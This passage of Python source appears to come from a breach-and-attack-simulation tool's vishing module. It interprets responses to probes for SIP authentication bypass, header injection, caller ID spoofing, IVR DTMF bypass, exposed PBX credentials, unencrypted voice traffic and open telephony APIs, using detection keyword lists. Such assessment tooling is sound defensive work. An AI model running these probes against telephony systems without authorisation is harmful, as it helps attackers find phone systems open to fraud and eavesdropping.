                    detail={"attack_type": attack_type, "extension": ext, "exists": True},
                )
            if response.status_code == 404:
                return ModuleResult(
                    module_name="vishing_sim", target=request.target,
                    status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
                    response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                    detail={"attack_type": attack_type, "extension": ext, "exists": False},
                )

        if attack_type == "SIP_AUTH_BYPASS":
            if response.status_code in (200, 202):
                return ModuleResult(
                    module_name="vishing_sim", target=request.target,
                    status=VulnStatus.VULNERABLE, payload_used=payload,
                    response_code=response.status_code,
                    response_body_preview=response.body_text[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence="SIP registration accepted without valid authentication",
                    severity="critical", mitre_technique_id="T1566.004",
                    detail={"attack_type": attack_type, "auth_bypass": True},
                )

        if attack_type == "SIP_INJECT":
            if response.status_code in (200, 202) and has_sip_response:
                return ModuleResult(
                    module_name="vishing_sim", target=request.target,
                    status=VulnStatus.VULNERABLE, payload_used=payload,
                    response_code=response.status_code,
                    response_body_preview=response.body_text[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence="SIP header injection accepted by proxy",
                    severity="high", mitre_technique_id="T1566.004",
                    detail={"attack_type": attack_type, "header_injected": True},
                )

        if attack_type == "SIP_SUBSCRIBE":
            if response.status_code in (200, 202):
                return ModuleResult(
                    module_name="vishing_sim", target=request.target,
                    status=VulnStatus.VULNERABLE, payload_used=payload,
                    response_code=response.status_code,
                    response_body_preview=response.body_text[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence="SIP SUBSCRIBE accepted - presence/dialog information may be leaked",
                    severity="medium", mitre_technique_id="T1598",
                    detail={"attack_type": attack_type, "subscribe_accepted": True},
                )

        if has_sip_response:
            # SIP service is responding - potentially vulnerable
            user_agent = ""
            ua_match = re.search(r'(?:user-agent|server):\s*(.+)', response.body_text, re.I)
            if ua_match:
                user_agent = ua_match.group(1).strip()

            return ModuleResult(
                module_name="vishing_sim", target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=f"SIP service responding (UA: {user_agent})" if user_agent else "SIP service responding",
                severity="medium", mitre_technique_id="T1598",
                detail={"attack_type": attack_type, "user_agent": user_agent},
            )

        return ModuleResult(
            module_name="vishing_sim", target=request.target,
            status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
            response_code=response.status_code, elapsed_ms=response.elapsed_ms,
            detail={"attack_type": attack_type},
        )

    def _analyze_caller_id(
        self, request: AttackRequest, response: AttackResponse, payload: str,
    ) -> ModuleResult:
        body_lower = response.body_text.lower()

        # Check if spoofing was detected
        detection_indicators = [
            "spoofing detected", "caller id invalid", "stir/shaken fail",
            "attestation failed", "blocked", "rejected", "fraud",
            "spoofed caller", "invalid identity",
        ]
        was_detected = any(ind in body_lower for ind in detection_indicators)

        if was_detected:
            return ModuleResult(
                module_name="vishing_sim", target=request.target,
                status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
                response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                evidence="Caller ID spoofing detected by STIR/SHAKEN or security controls",
                severity="info", mitre_technique_id="T1566.004",
                detail={"attack_type": "CID_SPOOF", "detected": True},
            )

        # Check if spoofed call was accepted
        accepted_indicators = [
            "connected", "ringing", "accepted", "verified", "valid",
            "attestation: a", "attestation: b", "pass",
        ]
        was_accepted = (
            response.status_code in (200, 201, 202)
            and any(ind in body_lower for ind in accepted_indicators)
        )

        if was_accepted:
            return ModuleResult(
                module_name="vishing_sim", target=request.target,
                status=VulnStatus.VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence="Caller ID spoofing not detected - spoofed identity accepted",
                severity="high", mitre_technique_id="T1566.004",
                detail={"attack_type": "CID_SPOOF", "spoof_accepted": True},
            )

        # No STIR/SHAKEN verification
        no_verification_indicators = [
            "no verification", "stir/shaken not configured",
            "verification unavailable", "not supported",
        ]
        no_verify = any(ind in body_lower for ind in no_verification_indicators)

        if no_verify:
            return ModuleResult(
                module_name="vishing_sim", target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence="Caller ID verification not available - STIR/SHAKEN not configured",
                severity="medium", mitre_technique_id="T1566.004",
                detail={"attack_type": "CID_SPOOF", "no_verification": True},
            )

        return ModuleResult(
            module_name="vishing_sim", target=request.target,
            status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
            response_code=response.status_code, elapsed_ms=response.elapsed_ms,
            detail={"attack_type": "CID_SPOOF"},
        )

    def _analyze_ivr(
        self, request: AttackRequest, response: AttackResponse, payload: str,
        attack_type: str,
    ) -> ModuleResult:
        body_lower = response.body_text.lower()

        if response.status_code not in (200, 201, 202):
            return ModuleResult(
                module_name="vishing_sim", target=request.target,
                status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
                response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                detail={"attack_type": attack_type},
            )

        # IVR menu/prompt exposure
        ivr_indicators = [
            "menu", "prompt", "press", "option", "extension",
            "transfer", "operator", "directory", "dial",
            "recording", "greeting", "auto-attendant",
        ]
        has_ivr_data = any(ind in body_lower for ind in ivr_indicators)

        # Audio/recording file exposure
        audio_indicators = [
            ".wav", ".mp3", ".ogg", ".gsm", ".ulaw", ".alaw",
            "audio/", "recording", "prompt",
        ]
        has_audio = any(ind in body_lower for ind in audio_indicators)

        if attack_type == "IVR_BYPASS":
            bypass_indicators = [
                "connected", "transferred", "extension reached",
                "direct line", "operator", "internal directory",
            ]
            was_bypassed = any(ind in body_lower for ind in bypass_indicators)
            if was_bypassed:
                dtmf = request.headers.get("X-BAS-DTMF", "")
                return ModuleResult(
                    module_name="vishing_sim", target=request.target,
                    status=VulnStatus.VULNERABLE, payload_used=payload,
                    response_code=response.status_code,
                    response_body_preview=response.body_text[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"IVR/auto-attendant bypass via DTMF '{dtmf}' - reached internal system",
                    severity="high", mitre_technique_id="T1566.004",
                    detail={"attack_type": attack_type, "dtmf": dtmf, "bypassed": True},
                )

        if has_audio:
            return ModuleResult(
                module_name="vishing_sim", target=request.target,
                status=VulnStatus.VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=f"IVR audio/recording files exposed at {request.path}",
                severity="medium", mitre_technique_id="T1598",
                detail={"attack_type": attack_type, "audio_exposed": True},
            )

        if has_ivr_data:
            return ModuleResult(
                module_name="vishing_sim", target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=f"IVR configuration data exposed at {request.path}",
                severity="medium", mitre_technique_id="T1598",
                detail={"attack_type": attack_type, "ivr_data": True},
            )

        return ModuleResult(
            module_name="vishing_sim", target=request.target,
            status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
            response_code=response.status_code, elapsed_ms=response.elapsed_ms,
            detail={"attack_type": attack_type},
        )

    def _analyze_pbx_config(
        self, request: AttackRequest, response: AttackResponse, payload: str,
    ) -> ModuleResult:
        body_lower = response.body_text.lower()

        if response.status_code not in (200, 301, 302):
            return ModuleResult(
                module_name="vishing_sim", target=request.target,
                status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
                response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                detail={"attack_type": "PBX_CONFIG"},
            )

        # Check for PBX configuration data
        has_config = any(ind in body_lower for ind in PBX_CONFIG_INDICATORS)

        # Check for credential exposure
        has_creds = any(ind in body_lower for ind in TELEPHONY_CRED_INDICATORS)

        if has_creds:
            return ModuleResult(
                module_name="vishing_sim", target=request.target,
                status=VulnStatus.VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=f"PBX credentials exposed at {request.path}",
                severity="critical", mitre_technique_id="T1598",
                detail={"attack_type": "PBX_CONFIG", "creds_exposed": True},
            )

        if has_config:
            return ModuleResult(
                module_name="vishing_sim", target=request.target,
                status=VulnStatus.VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=f"PBX configuration exposed at {request.path} - dial plan and extension info leaked",
                severity="high", mitre_technique_id="T1598",
                detail={"attack_type": "PBX_CONFIG", "config_exposed": True},
            )

        # Check for VoIP service fingerprinting
        detected_services = [
            svc for svc in VOIP_SERVICE_INDICATORS if svc in body_lower
        ]
        if detected_services:
            return ModuleResult(
                module_name="vishing_sim", target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=f"PBX system identified at {request.path}: {', '.join(detected_services)}",
                severity="medium", mitre_technique_id="T1598",
                detail={"attack_type": "PBX_CONFIG", "services": detected_services},
            )

        # Check for admin panel
        has_login = bool(re.search(r'<input[^>]*type=["\']password["\']', response.body_text, re.I))
        if has_login:
            return ModuleResult(
                module_name="vishing_sim", target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=f"PBX admin interface accessible at {request.path}",
                severity="medium", mitre_technique_id="T1598",
                detail={"attack_type": "PBX_CONFIG", "admin_panel": True},
            )

        return ModuleResult(
            module_name="vishing_sim", target=request.target,
            status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
            response_code=response.status_code, elapsed_ms=response.elapsed_ms,
            detail={"attack_type": "PBX_CONFIG"},
        )

    def _analyze_rtp(
        self, request: AttackRequest, response: AttackResponse, payload: str,
        attack_type: str,
    ) -> ModuleResult:
        body_lower = response.body_text.lower()

        if response.status_code not in (200, 201, 202):
            return ModuleResult(
                module_name="vishing_sim", target=request.target,
                status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
                response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                detail={"attack_type": attack_type},
            )

        # Check for SRTP misconfiguration
        rtp_check = request.headers.get("X-BAS-RTP-Check", "")

        if "SRTP_DISABLED" in rtp_check or "srtp_disabled" in rtp_check:
            srtp_indicators = ["srtp", "encryption", "secure rtp"]
            no_srtp = not any(ind in body_lower for ind in srtp_indicators)
            if no_srtp:
                return ModuleResult(
                    module_name="vishing_sim", target=request.target,
                    status=VulnStatus.VULNERABLE, payload_used=payload,
                    response_code=response.status_code,
                    response_body_preview=response.body_text[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence="SRTP not enabled - voice traffic transmitted unencrypted",
                    severity="high", mitre_technique_id="T1598",
                    detail={"attack_type": attack_type, "srtp_disabled": True},
                )

        if "NULL_CIPHER" in rtp_check or "NULL_AUTH" in rtp_check:
            if "null" in body_lower or "none" in body_lower:
                return ModuleResult(
                    module_name="vishing_sim", target=request.target,
                    status=VulnStatus.VULNERABLE, payload_used=payload,
                    response_code=response.status_code,
                    response_body_preview=response.body_text[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence="SRTP configured with null cipher/auth - no effective encryption",
                    severity="critical", mitre_technique_id="T1598",
                    detail={"attack_type": attack_type, "null_crypto": True},
                )

        # RTP stream configuration exposure
        rtp_config_indicators = [
            "rtp_port", "rtcp_port", "media_port", "codec",
            "payload_type", "ssrc", "jitter", "packet_loss",
        ]
        has_rtp_config = any(ind in body_lower for ind in rtp_config_indicators)

        if has_rtp_config:
            return ModuleResult(
                module_name="vishing_sim", target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence="RTP/media configuration data exposed",
                severity="medium", mitre_technique_id="T1598",
                detail={"attack_type": attack_type, "rtp_config_exposed": True},
            )

        return ModuleResult(
            module_name="vishing_sim", target=request.target,
            status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
            response_code=response.status_code, elapsed_ms=response.elapsed_ms,
            detail={"attack_type": attack_type},
        )

    def _analyze_telephony_api(
        self, request: AttackRequest, response: AttackResponse, payload: str,
        attack_type: str,
    ) -> ModuleResult:
        body_lower = response.body_text.lower()

        # Check for telephony credential exposure
        if attack_type == "TAPI_CRED":
            has_creds = any(ind in body_lower for ind in TELEPHONY_CRED_INDICATORS)
            if has_creds:
                return ModuleResult(
                    module_name="vishing_sim", target=request.target,
                    status=VulnStatus.VULNERABLE, payload_used=payload,
                    response_code=response.status_code,
                    response_body_preview=response.body_text[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"Telephony API credentials exposed at {request.path}",
                    severity="critical", mitre_technique_id="T1598",
                    detail={"attack_type": attack_type, "creds_exposed": True},
                )

        if response.status_code not in (200, 201, 202):
            # Check for auth required (API exists but protected)
            if response.status_code in (401, 403):
                return ModuleResult(
                    module_name="vishing_sim", target=request.target,
                    status=VulnStatus.POTENTIALLY_VULNERABLE, payload_used=payload,
                    response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                    evidence=f"Telephony API endpoint exists at {request.path} (auth required)",
                    severity="low", mitre_technique_id="T1598",
                    detail={"attack_type": attack_type, "auth_required": True},
                )
            return ModuleResult(
                module_name="vishing_sim", target=request.target,
                status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
                response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                detail={"attack_type": attack_type},
            )

        # API responded successfully -- check what was exposed
        call_indicators = [
            "call_id", "call_sid", "recording_url", "duration",
            "caller_id", "callee", "call_status",
        ]
        has_call_data = any(ind in body_lower for ind in call_indicators)

        recording_indicators = [
            "recording", ".wav", ".mp3", "transcription",
            "audio_url", "media_url",
        ]
        has_recordings = any(ind in body_lower for ind in recording_indicators)

        if has_recordings:
            return ModuleResult(
                module_name="vishing_sim", target=request.target,
                status=VulnStatus.VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=f"Call recordings accessible via {request.path}",
                severity="critical", mitre_technique_id="T1598",
                detail={"attack_type": attack_type, "recordings_exposed": True},
            )

        if has_call_data:
            return ModuleResult(
                module_name="vishing_sim", target=request.target,
                status=VulnStatus.VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=f"Call detail records accessible via {request.path}",
                severity="high", mitre_technique_id="T1598",
                detail={"attack_type": attack_type, "cdr_exposed": True},
            )

        # API is accessible without authentication
        action_indicators = [
            "initiated", "calling", "connected", "sent", "queued",
        ]
        api_action = any(ind in body_lower for ind in action_indicators)

        if api_action and request.method == "POST":
            return ModuleResult(
                module_name="vishing_sim", target=request.target,
                status=VulnStatus.VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=f"Telephony API at {request.path} accepts unauthenticated actions",
                severity="critical", mitre_technique_id="T1566.004",
                detail={"attack_type": attack_type, "unauth_action": True},
            )

        return ModuleResult(
            module_name="vishing_sim", target=request.target,
            status=VulnStatus.POTENTIALLY_VULNERABLE, payload_used=payload,
            response_code=response.status_code,
            response_body_preview=response.body_text[:500],
            elapsed_ms=response.elapsed_ms,
            evidence=f"Telephony API endpoint accessible at {request.path}",
            severity="medium", mitre_technique_id="T1598",
            detail={"attack_type": attack_type},
        )
